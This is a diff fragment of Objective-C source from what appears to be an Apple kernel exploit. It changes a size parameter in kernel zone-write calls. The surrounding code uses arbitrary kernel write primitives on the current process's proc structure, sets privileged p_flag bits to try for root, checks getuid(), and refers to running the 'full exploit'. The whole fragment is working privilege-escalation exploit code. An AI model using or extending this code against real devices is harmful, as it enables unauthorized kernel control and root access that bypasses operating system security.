@@ -748,12 +748,12 @@
                 [r appendFormat:@"  p_list.next = 0x%016llx\n", listNext];
                 // Write test to proc+0x00
                 uint64_t procTest = 0xAAAABBBBCCCCDDDDULL;
-                krw_zone_verdict pv = kwrite_zone_element_qword(proc, procTest, proc, 0x400);
+                krw_zone_verdict pv = kwrite_zone_element_qword(proc, procTest, proc, 0x1000);
                 uint64_t procRB = early_kread64(proc);
                 [r appendFormat:@"  proc+0 write: verdict=%d  readback=0x%016llx\n", (int)pv, procRB];
                 if (procRB == procTest) {
                     [r appendString:@"  >>> PROC WRITE VERIFIED! type 0x21 writable!\n"];
-                    kwrite_zone_element_qword(proc, listNext, proc, 0x400);
+                    kwrite_zone_element_qword(proc, listNext, proc, 0x1000);
                     [r appendString:@"  restored p_list.next\n"];
 
                     // ---- try p_flag for root ----
@@ -763,7 +763,7 @@
                     [r appendFormat:@"  p_flag = 0x%016llx (slot=0x%016llx)\n", origFlag, flagSlot];
                     // Set P_SUGID (0x00000400) and other privileged flags
                     uint64_t newFlag = origFlag | 0x00000400 | 0x00000800 | 0x00000020;
-                    krw_zone_verdict fv = kwrite_zone_element_qword(flagSlot, newFlag, proc, 0x400);
+                    krw_zone_verdict fv = kwrite_zone_element_qword(flagSlot, newFlag, proc, 0x1000);
                     uint64_t flagRB = early_kread64(flagSlot);
                     [r appendFormat:@"  p_flag write: verdict=%d  readback=0x%016llx\n", (int)fv, flagRB];
                     if (flagRB == newFlag) {
@@ -773,11 +773,11 @@
                         }
                     }
                     // Restore flag
-                    kwrite_zone_element_qword(flagSlot, origFlag, proc, 0x400);
+                    kwrite_zone_element_qword(flagSlot, origFlag, proc, 0x1000);
                     [r appendFormat:@"  getuid() after restore: %d\n", getuid()];
                 } else {
                     [r appendString:@"  >>> proc write did not persist\n"];
-                    kwrite_zone_element_qword(proc, listNext, proc, 0x400);
+                    kwrite_zone_element_qword(proc, listNext, proc, 0x1000);
                 }
             } else {
                 [r appendString:@"  self proc not found (run full exploit first)\n"];
